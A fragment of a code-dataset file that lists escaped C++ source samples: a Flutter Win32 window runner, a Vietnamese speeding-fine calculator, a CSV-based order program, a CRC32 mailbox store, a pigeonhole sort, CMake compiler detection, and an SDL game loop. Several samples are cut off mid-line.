enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "\ufeff#include \"pch.h\"\n#include <iostream>\n#include <string>\n#include \"speeding_fine.h\"\n\nusing namespace std;\n\nconst float max_speed = 70.0;\n\nstring speeding_fine(int vehicle, float speed) {\n    string fine = \"\";\n    float tmp = speed - max_speed;\n    if (vehicle == 1) { // \u00d4 t\u00f4\n        if (tmp > 35) {\n            fine = \"Muc phat tien: Tu 10.000.000 VND den 12.000.000 VND\";\n        }\n        else if (tmp > 20) {\n            fine = \"Muc phat tien: Tu 6.000.000 VND den 8.000.000 VND\";\n        }\n        else if (tmp > 10) {\n            fine = \"Muc phat tien: Tu 4.000.000 VND den 6.000.000 VND\";\n        }\n        else if (tmp > 5) {\n            fine = \"Muc phat tien: Tu 800.000 VND den 1.000.000 VND\";\n        }\n        else {\n            fine = \"Khong bi phat\";\n        }\n    }\n    else if (vehicle == 2) { // Xe m\u00e1y\n        if (tmp > 20) {\n            fine = \"Muc phat tien: Tu 4.000.000 VND den 5.000.000 VND\";\n        }\n        else if (tmp > 10) {\n            fine = \"Muc phat tien: Tu 800.000 VND den 1.000.000 VND\";\n        }\n        else if (tmp > 5) {\n            fine = \"Muc phat tien: Tu 300.000 VND den 400.000 VND\";\n\n        }\n        else {\n            fine = \"Khong bi phat\";\n        }\n    }\n    else {\n        fine = \"Loai phuong tien khong hop le\";\n    }\n\n    return fine;\n}\nint main(int argc, char** argv) {\n    ::testing::InitGoogleTest(&argc, argv);\n    return RUN_ALL_TESTS();\n    int vehicle;\n    float speed;\n    \n    // Nh\u1eadp v\u00e0o lo\u1ea1i ph\u01b0\u01a1ng ti\u1ec7n v\u00e0 t\u1ed1c \u0111\u1ed9\n    cout << \"Nhap vao loai phuong tien (1 - o to, 2 - xe may): \";\n    cin >> vehicle;\n    while (true) {\n        cout << \"Nhap vao toc do (khong am) (km/h): \";\n        cin >> speed;\n        if (!(speed < 0)) {\n            break;\n        }\n        else {\n            cout << \"Toc do khong duoc nho hon 0. Vui long nhap lai.\" << endl;\n        }\n    }\n    cout << speeding_fine(vehicle, speed);\n\n    return 0;\n}\n\n",
    "#include \"split.h\" // contains a split function that returns all fields that were separated by some character as a vector of strings\n#include <fstream>\n#include <iostream>\n#include <string>\n#include <vector>\n\nusing namespace std;\n\nstruct Item {\n  int id;\n  string description;\n  double price;\n};\n\nstruct Customer {\n  int id;\n  string name;\n  string address;\n  string city;\n  string state;\n  string zip;\n  string phone;\n  string email;\n};\n\nvector<Item> items;\n\nvector<Customer> customers;\n\nvoid read_customers(const string& filename) {\n  ifstream file(filename);\n  string line;\n  while (getline(file, line)) {\n    vector<string> fields = split(line, ',');\n    Customer customer;\n    customer.id = stoi(fields[0]);\n    customer.name = fields[1];\n    customer.address = fields[2];\n    customer.city = fields[3];\n    customer.state = fields[4];\n    customer.zip = fields[5];\n    customer.phone = fields[6];\n    customer.email = fields[7];\n    customers.push_back(customer);\n  }\n    cout << \"Total customers: \" << customers.size() << endl;\n}\n\nvoid read_items(const string& filename) {\n  ifstream file(filename);\n  string line;\n  while (getline(file, line)) {\n    vector<string> fields = split(line, ',');\n    Item item;\n    item.id = stoi(fields[0]);\n    item.description = fields[1];\n    item.price = stod(fields[2]);\n    items.push_back(item);\n  }\n    cout << \"Total items: \" << items.size() << endl;\n}\n\nvoid one_customer_order() {\n  cout << \"Enter customer number: \";\n  int customer_number;\n  try {\n    cin >> customer_number;\n  } catch (...) {\n    cout << \"Invalid customer number\" << endl;\n    return;\n  }\n  for (const Customer& customer : customers) {\n    if (customer.id == customer_number) {\n      cout << \"Welcome \" << customer.name << endl;\n      cout << \"Enter item number (0 to quit)\" << endl;\n      double total = 0;\n      vector<Item> customer_items;\n      while (true) {\n        int item_number;\n        cin >> item_number;\n        if (item_number == 0) {\n          cout << \"Thank you for shopping with us\" << endl;\n          cout << \"Customer: \" << customer.name << endl;\n          cout << \"Address: \" << customer.address << \", \" << customer.city << \", \" << customer.state << \" \" << customer.zip << endl;\n          cout << \"Phone: \" << customer.phone << endl;\n          cout << \"Email: \" << customer.email << endl;\n          cout << \"Items: \" << endl;\n          for (const Item& item : customer_items) {\n            cout << item.description << \": $\" << item.price << endl;\n          }\n          cout << \"Total Number of Items: \" << customer_items.size() << endl;\n          cout << \"Total: $\" << total << endl;\n          return;\n        }\n        for (int i = 0; i < items.size(); i++) {\n          if (items[i].id == item_number) {\n            total += items[i].price;\n            cout << \"Added \" << items[i].description << \": $\" << items[i].price << endl << endl;\n            customer_items.push_back(items[i]);\n            //collect garbage\n            cin.clear();\n            cout << \"Enter item number (0 to quit)\" << endl;\n            break;\n          }\n          if (i == items.size() - 1) {\n            cout << \"Item not found\" << endl << endl;\n            cout << \"Enter item number (0 to quit)\" << endl;\n          }\n        }\n            \n          \n        \n      }\n  }\n}\n  cout << \"Customer not found\" << endl;\n}\n\n\n\nint main() {\n  read_customers(\"customers.txt\");\n  read_items(\"items.txt\");\n  one_customer_order();\n}",
    "#include \"lb4mailbox.h\"\n\n#include <cstring>\n#include <fstream>\n#include <filesystem>\n\nchar UINT_RW_ARR[4];\n\nuint32_t crc32(const char* buf, uint32_t size) {\n    uint32_t crc = 0xFFFFFFFF;\n    while (size--) {\n        crc ^= *buf++;\n        for (int k = 0; k < 8; k++)\n            crc = crc & 1 ? crc >> 1 ^ 0x82f63b78 : crc >> 1;\n    }\n    return ~crc;\n}\n\nuint32_t readUint32(std::fstream& file) {\n    uint32_t result;\n    file.read(UINT_RW_ARR, 4);\n    memcpy(&result, UINT_RW_ARR, 4);\n\n    return result;\n}\n\nuint32_t readUint32(std::ifstream& file) {\n    return readUint32((std::fstream&)file);\n}\n\n\nMailboxEntry::MailboxEntry(const char* content, const uint32_t size) {\n    this->content_size = content[size-1] == '\\0' ? size - 1 : size;\n    this->content = new char[size];\n    memcpy(this->content, content, size);\n\n    this->checksum = crc32(this->content, this->content_size);\n}\n\nMailboxEntry::MailboxEntry(const std::string& content) {\n    this->content_size = content.size();\n    this->content = new char[this->content_size];\n    memcpy(this->content, content.c_str(), this->content_size);\n\n    this->checksum = crc32(this->content, this->content_size);\n}\n\nstd::string MailboxEntry::getContent() {\n    return std::string(content);\n}\n\n\nvoid MailboxEntry::write(std::ofstream& file) {\n    memcpy(UINT_RW_ARR, &content_size, 4);\n    file.write(UINT_RW_ARR, 4);\n\n    memcpy(UINT_RW_ARR, &checksum, 4);\n    file.write(UINT_RW_ARR, 4);\n\n    file.write(content, content_size);\n}\n\nMailBox::MailBox(const std::string& name) {\n    filename = name;\n\n    std::ifstream file(name, std::ios::binary);\n    max_size = readUint32(file);\n    current_index = readUint32(file);\n\n    file.seekg(0, std::ios::end);\n    const long size = file.tellg();\n    file.close();\n    if(size < max_size + 8)\n        throw std::underflow_error(\"Size if mailbox is too small!\");\n}\n\nMailBox::MailBox(const std::string& name, const uint32_t max_size) {\n    filename = name;\n    this->max_size = max_size;\n\n    std::ofstream file(name, std::ios::binary | std::ios::trunc);\n    memcpy(UINT_RW_ARR, &max_size, 4);\n    file.write(UINT_RW_ARR, 4);\n    memcpy(UINT_RW_ARR, &current_index, 4);\n    file.write(UINT_RW_ARR, 4);\n\n    uint32_t tmp = 0;\n    for(int i = 0; i < max_size; i++) {\n        memcpy(UINT_RW_ARR, &tmp, 4);\n        file.write(UINT_RW_ARR, 4);\n    }\n\n    file.close();\n}\n\nuint32_t MailBox::getMaxSize() {\n    return max_size;\n}\n\nuint32_t MailBox::getEntriesCount() {\n    return current_index;\n}\n\nuint64_t MailBox::getCurrentSize() {\n    std::ifstream file(filename, std::ios::binary);\n    uint64_t total_size = 0;\n\n    file.seekg(8);\n\n    for(uint32_t i = 0; i < current_index; i++) {\n        uint32_t tmp = readUint32(file);\n\n        uint32_t current_pos = file.tellg();\n        file.seekg(max_size*4+8+tmp);\n\n        total_size += readUint32(file);\n\n        file.seekg(current_pos);\n    }\n\n    file.close();\n\n    return total_size;\n}\n\nvoid MailBox::addEntry(MailboxEntry* entry) {\n    if(current_index >= max_size)\n        throw std::overflow_error(\"Mailbox is full!\");\n\n    std::ofstream file(filename, std::ios::ate | std::ios::in | std::ios::out | std::ios::binary);\n\n    const uint32_t ptr = (long)file.tellp() - (max_size*4+8);\n    entry->write(file);\n\n    file.seekp(current_index*4+8);\n    memcpy(UINT_RW_ARR, &ptr, 4);\n    file.write(UINT_RW_ARR, 4);\n\n    current_index++;\n\n    file.seekp(4);\n    memcpy(UINT_RW_ARR, &current_index, 4);\n    file.write(UINT_RW_ARR, 4);\n\n    file.close();\n}\n\nMailboxEntry* MailBox::readEntry(const uint32_t index, const bool del) {\n    if(index >= current_index)\n        throw std::range_error(\"Requested mail entry does not exist!\");\n\n    std::ifstream file(filename, std::ios::binary);\n\n    file.seekg(8+(index*4));\n    uint32_t tmp = readUint32(file);\n\n    file.seekg(max_size*4+8+tmp);\n\n    uint32_t size = readUint32(file);\n    uint32_t checksum = readUint32(file);\n\n    char* content = new char[size+1];\n    file.read(content, size);\n    content[size] = '\\0';\n    file.close();\n\n    if(crc32(content, size) != checksum)\n        throw std::runtime_error(\"Mail entry checksum mismatch!\");\n\n    auto* entry = new MailboxEntry(content, size+1);\n\n    delete[] content;\n\n    if(del)\n        deleteEntry(index);\n\n    return entry;\n}\n\nvoid MailBox::deleteEntry(uint32_t index) {\n    if(index >= current_index)\n        throw std::range_error(\"Requested mail entry does not exist!\");\n    std::fstream file(filename, std::ios::ate | std::ios::in | std::ios::out | std::ios::binary);\n\n    file.seekg(8+(index*4));\n    uint32_t tmp = readUint32(file);\n    file.seekg(8+(max_size*4) + tmp);\n    tmp = readUint32(file);\n    uint32_t bytes_to_move = tmp + 8;\n\n    uint32_t indexes_to_move = current_index - index - 1;\n    char* indexes = new char[indexes_to_move * 4];\n\n    file.seekg(8 + (4 * index)+4);\n    file.read(indexes, indexes_to_move * 4);\n\n    file.seekp(8 + (4 * index));\n    file.write(indexes, indexes_to_move * 4);\n\n    delete[] indexes;\n\n    current_index--;\n\n    file.s",
    "#include <iostream>\n#include <vector>\n#include <algorithm>\n#include <cstdlib>\n\nvoid createPigeon(int* arr, int size, int min, int max, int* osarr) {\n    std::copy(arr, arr+size, osarr);\n    int range = max - min + 1;\n    std::vector<int> holes[range];\n    for (int i = 0; i < size; ++i) {\n        holes[arr[i] - min].push_back(arr[i]);\n    }\n    int index = 0;\n    for (int i = 0; i < range; ++i) {\n        std::vector<int>::iterator it;\n        for (it=holes[i].begin(); it != holes[i].end(); ++it) {\n            arr[index++] = *it;\n        }\n    }\n}\nvoid printing(int* arr, int size) {\n    for (int i = 0; i < size; ++i) {\n        std::cout << arr[i] << \" \";\n    }\n    std::cout << std::endl;\n}\n\nint findMax(int* arr, int size) {\n    int* finder = new int[size];\n    int max;\n    std::copy(arr, arr+size, finder);\n    max = finder[0];\n    for (int i = 1; i < size; ++i) {\n        if (max < arr[i]) {\n            max = arr[i];\n        }\n    }\n    delete[] finder;\n    return max;\n}\n\nint findMin(int* arr, int size) {\n    int* finder = new int[size];\n    int min;\n    std::copy(arr, arr+size, finder);\n    min = finder[0];\n    for (int i = 1; i < size; ++i) {\n        if (min > arr[i]) {\n            min = arr[i];\n        }\n    }\n    delete[] finder;\n    return min;\n}\n\nint main() {\n    int liczba, nmax, nmin;\n    std::cout << \"podaj liczbe: \";\n    std::cin >> liczba;\n    int* arr = new int[liczba];\n    int* sarr = new int[liczba];\n    srand((unsigned) time(NULL));\n    for (int i = 0; i < liczba; ++i) {\n        int temp = rand() % 99;\n        arr[i] = temp;\n    }\n    nmax = findMax(arr, liczba);\n    nmin = findMin(arr, liczba);\n    createPigeon(arr, liczba, nmin, nmax, sarr);\n    std::cout << \"unsorted:\" << std::endl;\n    printing(sarr, liczba);\n    std::cout << \"sorted: \" << std::endl;\n    printing(arr, liczba);\n    delete[] sarr;\n    delete[] arr;\n    return 0;\n}\n",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n  /* __INTEL_COMPILER = VRP */\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n# if defined(__INTEL_COMPILER_UPDATE)\n#  define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n# else\n#  define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n  /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ = VVRP + 1100 */\n# define COMPILER_VERSION_MAJOR DEC((__WATCOMC__ - 1100) / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__SUNPRO_CC)\n# define COMPILER_ID \"SunPro\"\n# if __SUNPRO_CC >= 0x5100\n   /* __SUNPRO_CC = 0xVRRP */\n#  define COMPILER_VERSION_MAJOR HEX(__SUNPRO_CC>>12)\n#  define COMPILER_VERSION_MINOR HEX(__SUNPRO_CC>>4 & 0xFF)\n#  define COMPILER_VERSION_PATCH HEX(__SUNPRO_CC    & 0xF)\n# else\n   /* __SUNPRO_CC = 0xVRP */\n#  define COMPILER_VERSION_MAJOR HEX(__SUNPRO_CC>>8)\n#  define COMPILER_VERSION_MINOR HEX(__SUNPRO_CC>>4 & 0xF)\n#  define COMPILER_VERSION_PATCH HEX(__SUNPRO_CC    & 0xF)\n# endif\n\n#elif defined(__HP_aCC)\n# define COMPILER_ID \"HP\"\n  /* __HP_aCC = VVRRPP */\n# define COMPILER_VERSION_MAJOR DEC(__HP_aCC/10000)\n# define COMPILER_VERSION_MINOR DEC(__HP_aCC/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__HP_aCC     % 100)\n\n#elif defined(__DECCXX)\n# define COMPILER_ID \"Compaq\"\n  /* __DECCXX_VER = VVRRTPPPP */\n# define COMPILER_VERSION_MAJOR DEC(__DECCXX_VER/10000000)\n# define COMPILER_VERSION_MINOR DEC(__DECCXX_VER/100000  % 100)\n# define COMPILER_VERSION_PATCH DEC(__DECCXX_VER         % 10000)\n\n#elif defined(__IBMCPP__) && defined(__COMPILER_VER__)\n# define COMPILER_ID \"zOS\"\n  /* __IBMCPP__ = VRP */\n# define COMPILER_VERSION_MAJOR DEC(__IBMCPP__/100)\n# define COMPILER_VERSION_MINOR DEC(__IBMCPP__/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__IBMCPP__    % 10)\n\n#elif defined(__IBMCPP__) && !defined(__COMPILER_VER__) && __IBMCPP__ >= 800\n# define COMPILER_ID \"XL\"\n  /* __IBMCPP__ = VRP */\n# define COMPILER_VERSION_MAJOR DEC(__IBMCPP__/100)\n# define COMPILER_VERSION_MINOR DEC(__IBMCPP__/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__IBMCPP__    % 10)\n\n#elif defined(__IBMCPP__) && !defined(__COMPILER_VER__) && __IBMCPP__ < 800\n# define COMPILER_ID \"VisualAge\"\n  /* __IBMCPP__ = VRP */\n# define COMPILER_VERSION_MAJOR DEC(__IBMCPP__/100)\n# define COMPILER_VERSION_MINOR DEC(__IBMCPP__/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__IBMCPP__    % 10)\n\n#elif defined(__PGI)\n# define COMPILER_ID \"PGI\"\n# define COMPILER_VERSION_MAJOR DEC(__PGIC__)\n# define COMPILER_VERSION_MINOR DEC(__PGIC_MINOR__)\n# if defined(__PGIC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PGIC_PATCHLEVEL__)\n# endif\n\n#elif defined(_CRAYC)\n# define COMPILER_ID \"Cray\"\n# define COMPILER_VERSION_MAJOR DEC(_RELEASE_M",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"mobx_example\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <SDL.h>\n#include <SDL_image.h>\n#include <iostream>\n#include <winsock2.h>\n#include <windows.h>\n#include \"Artist.h\"\n#include \"Controller.h\"\n#include \"Board.h\"\n#include \"Pathfinding.h\"\n\n\n\nint main(int argc, char* argv[])\n{\n\t//Declare Artist and controller\n\tArtist artist;\n\tController controller;\n\tBoard board;\n\tPathfinding pathfinding;\n\t\n\n\t//Start up SDL and create window\n\tif (!artist.init())\n\t{\n\t\tprintf(\"Failed to initialize!\\n\");\n\t}\n\telse\n\t{\n\t\t//Load media\n\t\tif (!artist.loadMedia())\n\t\t{\n\t\t\tprintf(\"Failed to load media!\\n\");\n\t\t}\n\t\telse\n\t\t{\n\t\t\t//loading setting ect\n\t\t\t\n\t\t\tboard.initBoard();\n\n\t\t\tpathfinding.initPathfinder();\n\t\t\t\n\t\t\t//board.findPath();\n\t\t\t\n\t\t\t//While application is running\n\t\t\twhile (!Controller::quit)\n\t\t\t{\n\t\t\t\t//Clear screen\n\t\t\t\tartist.clearScreen();\n\n\n\n\n\t\t\t\t//Updates game world\n\t\t\t\tpathfinding.update();\n\t\t\t\tboard.update();\n\n\t\t\t\t//Draw everything\n\t\t\t\tartist.draw();\n\n\t\t\t\t//Checks for user input\n\t\t\t\tcontroller.controller();\n\n\n\n\n\t\t\t\t//Update screen\n\t\t\t\tartist.updateScreen();\n\t\t\t}\n\t\t}\n\t}\n\n\t//Free resources and close SDL\n\tartist.close();\n\n\treturn 0;\n}",
